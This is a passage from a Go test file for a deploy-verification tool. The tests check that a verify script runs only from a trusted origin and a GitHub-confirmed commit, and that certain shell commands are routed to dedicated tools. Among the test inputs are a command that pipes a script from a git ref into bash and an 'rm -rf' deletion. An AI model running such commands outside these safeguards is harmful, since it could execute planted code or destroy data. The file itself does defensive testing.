	out = RunVerify(context.Background(), fakeGitHub(evil, good, false, &ran), req, dir, []string{gitBlobID([]byte(evil))})
	if len(ran) != 2 || !strings.Contains(out, "PASS /billing") || !strings.Contains(out, "FAIL /x") {
		t.Fatalf("Board-trusted blob: ran=%d %s", len(ran), out)
	}

	// A checkout whose origin is not the verified repo never runs the script:
	// its origin/dev-server could be a fork's.
	for _, origin := range []string{"git@github.com:fork/mansol_apps.git\n", "/tmp/local-mirror\n", ""} {
		gh := fakeGitHub(good, good, false, &ran)
		repointed := func(ctx context.Context, c Cmd) Result {
			if c.Name == "git" && strings.Join(c.Args, " ") == "remote get-url origin" {
				return Result{Stdout: origin}
			}
			return gh(ctx, c)
		}
		before := len(ran)
		out = RunVerify(context.Background(), repointed, req, dir, nil)
		if len(ran) != before || !strings.Contains(out, "NOT ON DEV: origin of") {
			t.Fatalf("origin %q: ran=%d %s", origin, len(ran)-before, out)
		}
	}

	// The fetch uses the checked URL, and a failed fetch stops the run: a
	// stale or planted origin/dev-server must not be what the script checks.
	for _, fail := range []bool{false, true} {
		gh := fakeGitHub(good, good, false, &ran)
		var fetched []string
		fetchRunner := func(ctx context.Context, c Cmd) Result {
			if c.Name == "git" && len(c.Args) > 0 && c.Args[0] == "fetch" {
				fetched = c.Args
				if fail {
					return Result{ExitCode: 128, Output: "fatal: could not read from remote"}
				}
				return Result{}
			}
			return gh(ctx, c)
		}
		before := len(ran)
		out = RunVerify(context.Background(), fetchRunner, req, dir, nil)
		if got := strings.Join(fetched, " "); got != "fetch --no-tags git@github.com:org/mansol_apps.git +refs/heads/dev-server:refs/remotes/origin/dev-server" {
			t.Fatalf("fetch argv %q", got)
		}
		if fail && (len(ran) != before || !strings.Contains(out, "NOT ON DEV: could not fetch")) {
			t.Fatalf("failed fetch still ran the script: %s", out)
		}
		if !fail && len(ran) != before+1 {
			t.Fatalf("good fetch did not run the script: %s", out)
		}
	}

	// A fetch that local git config redirected (insteadOf, sshCommand)
	// leaves a ref GitHub's API does not report: the script never runs.
	gh := fakeGitHub(good, good, false, &ran)
	redirected := func(ctx context.Context, c Cmd) Result {
		if c.Name == "git" && len(c.Args) > 0 && c.Args[0] == "rev-parse" {
			return Result{Stdout: strings.Repeat("f", 40) + "\n"}
		}
		return gh(ctx, c)
	}
	before := len(ran)
	if out = RunVerify(context.Background(), redirected, req, dir, nil); len(ran) != before || !strings.Contains(out, "GitHub's API reports") {
		t.Fatalf("redirected fetch ran the script: %s", out)
	}

	// The script gets the full sha GitHub resolved, never the short one.
	var scriptArgs []string
	fullRunner := func(ctx context.Context, c Cmd) Result {
		if c.Name == "bash" {
			scriptArgs = c.Args
		}
		return gh(ctx, c)
	}
	RunVerify(context.Background(), fullRunner, req, dir, nil)
	if len(scriptArgs) < 3 || scriptArgs[2] != fullSHA {
		t.Fatalf("script args %q, want full sha %s", scriptArgs, fullSHA)
	}
	// A short sha GitHub cannot resolve (ambiguous, unknown) never runs it.
	for _, answer := range []string{"", "notasha", "ffff" + fullSHA[4:]} {
		unresolved := func(ctx context.Context, c Cmd) Result {
			if c.Name == "gh" && strings.Contains(strings.Join(c.Args, " "), "/commits/") {
				return Result{Stdout: answer + "\n"}
			}
			return gh(ctx, c)
		}
		before := len(ran)
		if out = RunVerify(context.Background(), unresolved, req, dir, nil); len(ran) != before || !strings.Contains(out, "no single commit") {
			t.Fatalf("unresolved sha %q ran the script: %s", answer, out)
		}
	}

	// GitHub, not local objects, decides whether sha is on dev-server.
	for _, status := range []string{"behind", "diverged", ""} {
		notOn := func(ctx context.Context, c Cmd) Result {
			if c.Name == "gh" && strings.Contains(strings.Join(c.Args, " "), "/compare/") {
				return Result{Stdout: status + "\n"}
			}
			return gh(ctx, c)
		}
		before := len(ran)
		if out = RunVerify(context.Background(), notOn, req, dir, nil); len(ran) != before || !strings.Contains(out, "GitHub does not show "+fullSHA+" on dev-server") {
			t.Fatalf("compare %q ran the script: %s", status, out)
		}
	}
}

func TestSummarizeVerifyAddsMissingVerdict(t *testing.T) {
	out := summarizeVerify(Result{Output: "PASS a\nboom\n", ExitCode: 2})
	if !strings.Contains(out, "NOT ON DEV: verify script ended without a verdict (exit 2)") {
		t.Fatalf("no verdict line added: %s", out)
	}
}

func TestBashRedirect(t *testing.T) {
	hosts := config.HostClasses{Dev: []string{"mansol-dev"}, Prod: []string{"mansol-prod"}}
	redirect := map[string]string{
		"ssh mansol-dev 'cd /var/www && git status'":               "dev_host_run",
		"ssh -o ConnectTimeout=10 mansol-dev 'git pull --ff-only'": "dev_host_run",
		"ssh -p 22 deploy@mansol-dev systemctl restart web":        "dev_host_run",
		"ssh ssh://mansol-dev:22 uptime":                           "dev_host_run",
		"/usr/bin/ssh -T mansol-dev":                               "dev_host_run",
		"git fetch origin dev-server && git show origin/dev-server:scripts/verify_dev_deploy.sh | bash -s -- abc /x=y": "dev_deploy_verify",
		"cat ~/.staypoint/handoffs/task-1/plan.md":                    "staypoint_query",
		"sqlite3 $HOME/.staypoint/staypoint.db 'select * from tasks'": "staypoint_query",
		"ls -la /Users/someone/.staypoint/handoffs":                   "staypoint_query",
		"cat > /tmp/comment.md <<'EOF'\nhello\nEOF":                   "task_comment",
		"cat <<EOF > /tmp/pr-body.md\nbody\nEOF":                      "pr_body",
		"gh pr merge 12 --merge":                                      "pr_merge",
		"gh -R o/r pr merge 12":                                       "pr_merge",
	}
	for cmd, tool := range redirect {
		if got := BashRedirect(cmd, hosts); !strings.Contains(got, tool) {
			t.Errorf("BashRedirect(%q) = %q, want pointer to %s", cmd, got, tool)
		}
	}
	pass := []string{
		"ssh mansol-prod uptime",
		"ssh unknown-box uptime",
		"ssh-keygen -t ed25519",
		"cat README.md",
		"git log --oneline -5",
		"cat > notes.md <<EOF\nx\nEOF",
		"echo ~/.staypoint",
		"rm -rf ~/.staypoint/handoffs/x",
		"gh pr view 12",
		"gh pr create --title merge",
	}
	for _, cmd := range pass {
		if got := BashRedirect(cmd, hosts); got != "" {
			t.Errorf("BashRedirect(%q) = %q, want none", cmd, got)
		}
	}
}
